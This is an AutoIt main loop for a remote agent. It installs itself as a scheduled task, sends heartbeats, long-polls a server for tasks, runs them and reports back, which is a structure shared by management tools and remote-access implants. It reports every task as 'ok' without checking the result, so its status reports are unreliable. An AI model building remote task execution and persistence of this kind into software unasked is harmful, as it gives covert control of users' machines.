; agent_main.au3
#include "agent_config.au3"
#include "agent_util.au3"
#include "agent_http.au3"
#include "agent_commands.au3"
#include "agent_updater.au3"

Global Const $AGENT_VERSION = _Cfg_Version()
Global $gClientId = _ComputeClientId()
Global $gLastBeat = TimerInit()

If $CmdLineRaw = "/service" Then
    _EnsureScheduledTask()
EndIf

_Log("Agent start v" & $AGENT_VERSION & ", id=" & $gClientId)
_Log("server=" & _Cfg_Server())

While 1
    ; Check update (non-blocking stub)
    _Updater_CheckAndMaybeUpdate()

    ; Heartbeat every 60s
    If TimerDiff($gLastBeat) > 60000 Then
        _Api_Callback($gClientId, "live", "heartbeat")
        $gLastBeat = TimerInit()
    EndIf

    ; Long-poll task (stub returns empty if none/err)
    Local $task = _Api_LongPollTask($gClientId)
    If IsArray($task) And UBound($task) > 0 Then
        _Api_Callback($gClientId, "busy", "Task:" & $task[0])
        Local $res = _ExecuteTask($task)
        _Api_PostResult($gClientId, $task[0], True, "ok", "")
        _Api_Callback($gClientId, "idle", "Done:" & $task[0])
    Else
        Sleep(2000)
    EndIf
WEnd
